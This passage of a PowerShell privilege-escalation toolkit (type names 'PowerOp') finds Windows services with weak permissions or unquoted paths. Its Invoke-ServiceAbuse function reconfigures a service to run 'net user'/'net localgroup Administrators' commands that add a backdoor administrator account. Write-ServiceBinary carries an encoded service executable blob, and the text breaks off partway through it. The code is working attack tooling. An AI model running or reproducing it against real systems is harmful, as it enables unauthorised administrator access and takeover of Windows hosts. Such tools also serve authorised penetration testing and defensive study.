        [ValidateSet('SeCreateTokenPrivilege', 'SeAssignPrimaryTokenPrivilege', 'SeLockMemoryPrivilege', 'SeIncreaseQuotaPrivilege', 'SeUnsolicitedInputPrivilege', 'SeMachineAccountPrivilege', 'SeTcbPrivilege', 'SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeSystemProfilePrivilege', 'SeSystemtimePrivilege', 'SeProfileSingleProcessPrivilege', 'SeIncreaseBasePriorityPrivilege', 'SeCreatePagefilePrivilege', 'SeCreatePermanentPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeShutdownPrivilege', 'SeDebugPrivilege', 'SeAuditPrivilege', 'SeSystemEnvironmentPrivilege', 'SeChangeNotifyPrivilege', 'SeRemoteShutdownPrivilege', 'SeUndockPrivilege', 'SeSyncAgentPrivilege', 'SeEnableDelegationPrivilege', 'SeManageVolumePrivilege', 'SeImpersonatePrivilege', 'SeCreateGlobalPrivilege', 'SeTrustedCredManAccessPrivilege', 'SeRelabelPrivilege', 'SeIncreaseWorkingSetPrivilege', 'SeTimeZonePrivilege', 'SeCreateSymbolicLinkPrivilege')]
        [String[]]
        $Privilege
    )

    PROCESS {
        ForEach ($Priv in $Privilege) {
            [UInt32]$PreviousState = 0
            Write-Verbose "Attempting to enable $Priv"
            $Success = $NTDll::RtlAdjustPrivilege($SecurityEntity::$Priv, $True, $False, [ref]$PreviousState)
            if ($Success -ne 0) {
                Write-Warning "RtlAdjustPrivilege for $Priv failed: $Success"
            }
        }
    }
}


function Add-ServiceDacl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('ServiceProcess.ServiceController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    BEGIN {
        filter Local:Get-ServiceReadControlHandle {
            [OutputType([IntPtr])]
            Param(
                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
                [ValidateNotNullOrEmpty()]
                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
                $Service
            )

            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
            $ReadControl = 0x00020000
            $RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))
            $RawHandle
        }
    }

    PROCESS {
        ForEach($ServiceName in $Name) {

            $IndividualService = Get-Service -Name $ServiceName -ErrorAction Stop

            try {
                Write-Verbose "Add-ServiceDacl IndividualService : $($IndividualService.Name)"
                $ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose "Error opening up the service handle with read control for $($IndividualService.Name) : $_"
            }

            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                $SizeNeeded = 0

                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # 122 == The data area passed to a system call is too small
                if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
                    $BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)

                    $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (-not $Result) {
                        Write-Error ([ComponentModel.Win32Exception] $LastError)
                    }
                    else {
                        $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
                        $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                            Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                        }
                        Add-Member -InputObject $IndividualService -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
                    }
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                }
                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}


function Set-ServiceBinaryPath {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Position=1, Mandatory = $True)]
        [Alias('BinaryPath', 'binPath')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    BEGIN {
        filter Local:Get-ServiceConfigControlHandle {
            [OutputType([IntPtr])]
            Param(
                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
                [ServiceProcess.ServiceController]
                [ValidateNotNullOrEmpty()]
                $TargetService
            )
            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
            $ConfigControl = 0x00000002
            $RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))
            $RawHandle
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            try {
                $ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose "Error opening up the service handle with read control for $IndividualService : $_"
            }

            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {

                $SERVICE_NO_CHANGE = [UInt32]::MaxValue
                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$Path", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if ($Result -ne 0) {
                    Write-Verbose "binPath for $IndividualService successfully set to '$Path'"
                    $True
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                    $Null
                }

                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}


function Test-ServiceDaclPermission {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('ServiceProcess.ServiceController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName', 'Service')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String[]]
        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
        $Permissions,

        [String]
        [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
        $PermissionSet = 'ChangeConfig'
    )

    BEGIN {
        $AccessMask = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
            'AllAccess'             = [uint32]'0x000F01FF'
        }

        $CheckAllPermissionsInSet = $False

        if ($PSBoundParameters['Permissions']) {
            $TargetPermissions = $Permissions
        }
        else {
            if ($PermissionSet -eq 'ChangeConfig') {
                $TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
            }
            elseif ($PermissionSet -eq 'Restart') {
                $TargetPermissions = @('Start', 'Stop')
                $CheckAllPermissionsInSet = $True # so we check all permissions && style
            }
            elseif ($PermissionSet -eq 'AllAccess') {
                $TargetPermissions = @('GenericAll', 'AllAccess')
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = $IndividualService | Add-ServiceDacl

            if ($TargetService -and $TargetService.Dacl) {

                # enumerate all group SIDs the current user is a part of
                $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
                $CurrentUserSids += $UserIdentity.User.Value

                ForEach($ServiceDacl in $TargetService.Dacl) {
                    if ($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {

                        if ($CheckAllPermissionsInSet) {
                            $AllMatched = $True
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions && style
                                if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
                                    # Write-Verbose "Current user doesn't have '$TargetPermission' for $($TargetService.Name)"
                                    $AllMatched = $False
                                    break
                                }
                            }
                            if ($AllMatched) {
                                $TargetService
                            }
                        }
                        else {
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions || style
                                if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
                                    Write-Verbose "Current user has '$TargetPermission' for $IndividualService"
                                    $TargetService
                                    break
                                }
                            }
                        }
                    }
                }
            }
            else {
                Write-Verbose "Error enumerating the Dacl for service $IndividualService"
            }
        }
    }
}


########################################################
#
# Service enumeration
#
########################################################

function Get-UnquotedService {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.UnquotedService')]
    [CmdletBinding()]
    Param()

    # find all paths to service .exe's that have a space in the path and aren't quoted
    $VulnServices = Get-WmiObject -Class win32_service | Where-Object {
        $_ -and ($Null -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'
    }

    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {

            $SplitPathArray = $Service.pathname.Split(' ')
            $ConcatPathArray = @()
            for ($i=0;$i -lt $SplitPathArray.Count; $i++) {
                        $ConcatPathArray += $SplitPathArray[0..$i] -join ' '
            }

            $ModifiableFiles = $ConcatPathArray | Get-ModifiablePath

            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $CanRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
                $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
                $Out | Add-Member Aliasproperty Name ServiceName
                $Out.PSObject.TypeNames.Insert(0, 'PowerOp.UnquotedService')
                $Out
            }
        }
    }
}


function Get-ModifiableServiceFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.ModifiableServiceFile')]
    [CmdletBinding()]
    Param()

    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $ServiceName = $_.name
        $ServicePath = $_.pathname
        $ServiceStartName = $_.startname

        $ServicePath | Get-ModifiablePath | ForEach-Object {
            $CanRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $ServiceName
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'Path' $ServicePath
            $Out | Add-Member Noteproperty 'ModifiableFile' $_.ModifiablePath
            $Out | Add-Member Noteproperty 'ModifiableFilePermissions' $_.Permissions
            $Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
            $Out | Add-Member Aliasproperty Name ServiceName
            $Out.PSObject.TypeNames.Insert(0, 'PowerOp.ModifiableServiceFile')
            $Out
        }
    }
}


function Get-ModifiableService {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.ModifiableService')]
    [CmdletBinding()]
    Param()

    Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {
        $ServiceDetails = $_ | Get-ServiceDetail
        $CanRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
        $Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
        $Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
        $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
        $Out | Add-Member Aliasproperty Name ServiceName
        $Out.PSObject.TypeNames.Insert(0, 'PowerOp.ModifiableService')
        $Out
    }
}


function Get-ServiceDetail {


    [OutputType('PowerOp.ModifiableService')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    PROCESS {
        ForEach($IndividualService in $Name) {
            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            if ($TargetService) {
                Get-WmiObject -Class win32_service -Filter "Name='$($TargetService.Name)'" | Where-Object {$_} | ForEach-Object {
                    try {
                        $_
                    }
                    catch {
                        Write-Verbose "Error: $_"
                    }
                }
            }
        }
    }
}


########################################################
#
# Service abuse
#
########################################################

function Invoke-ServiceAbuse {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerOp.AbusedService')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserName = 'john',

        [ValidateNotNullOrEmpty()]
        [String]
        $Password = 'Password123!',

        [ValidateNotNullOrEmpty()]
        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command,

        [Switch]
        $Force
    )

    BEGIN {

        if ($PSBoundParameters['Command']) {
            $ServiceCommands = @($Command)
        }

        else {
            if ($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if ($UserNameToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommands = @("net localgroup $LocalGroup $UserNameToAdd /add")
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommands = @("net user $UserNameToAdd $PasswordToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            $ServiceDetails = $TargetService | Get-ServiceDetail

            $RestoreDisabled = $False
            if ($ServiceDetails.StartMode -match 'Disabled') {
                Write-Verbose "Service '$(ServiceDetails.Name)' disabled, enabling..."
                $TargetService | Set-Service -StartupType Manual -ErrorAction Stop
                $RestoreDisabled = $True
            }

            $OriginalServicePath = $ServiceDetails.PathName
            $OriginalServiceState = $ServiceDetails.State

            Write-Verbose "Service '$($TargetService.Name)' original path: '$OriginalServicePath'"
            Write-Verbose "Service '$($TargetService.Name)' original state: '$OriginalServiceState'"

            ForEach($ServiceCommand in $ServiceCommands) {

                if ($PSBoundParameters['Force']) {
                    $TargetService | Stop-Service -Force -ErrorAction Stop
                }
                else {
                    $TargetService | Stop-Service -ErrorAction Stop
                }

                Write-Verbose "Executing command '$ServiceCommand'"
                $Success = $TargetService | Set-ServiceBinaryPath -Path "$ServiceCommand"

                if (-not $Success) {
                    throw "Error reconfiguring the binary path for $($TargetService.Name)"
                }

                $TargetService | Start-Service -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 2
            }

            if ($PSBoundParameters['Force']) {
                $TargetService | Stop-Service -Force -ErrorAction Stop
            }
            else {
                $TargetService | Stop-Service -ErrorAction Stop
            }

            Write-Verbose "Restoring original path to service '$($TargetService.Name)'"
            Start-Sleep -Seconds 1
            $Success = $TargetService | Set-ServiceBinaryPath -Path "$OriginalServicePath"

            if (-not $Success) {
                throw "Error restoring the original binPath for $($TargetService.Name)"
            }

            # try to restore the service to whatever the service's original state was
            if ($RestoreDisabled) {
                Write-Verbose "Re-disabling service '$($TargetService.Name)'"
                $TargetService | Set-Service -StartupType Disabled -ErrorAction Stop
            }
            elseif ($OriginalServiceState -eq "Paused") {
                Write-Verbose "Starting and then pausing service '$($TargetService.Name)'"
                $TargetService | Start-Service
                Start-Sleep -Seconds 1
                $TargetService | Set-Service -Status Paused -ErrorAction Stop
            }
            elseif ($OriginalServiceState -eq "Stopped") {
                Write-Verbose "Leaving service '$($TargetService.Name)' in stopped state"
            }
            else {
                Write-Verbose "Restarting '$($TargetService.Name)'"
                $TargetService | Start-Service
            }

            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceAbused' $TargetService.Name
            $Out | Add-Member Noteproperty 'Command' $($ServiceCommands -join ' && ')
            $Out.PSObject.TypeNames.Insert(0, 'PowerOp.AbusedService')
            $Out
        }
    }
}


function Write-ServiceBinary {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerOp.ServiceBinary')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command,

        [String]
        $Path = "$(Convert-Path .)\service.exe"
    )

    BEGIN {
        # the raw unpatched service binary
        $Bx64Binary = "=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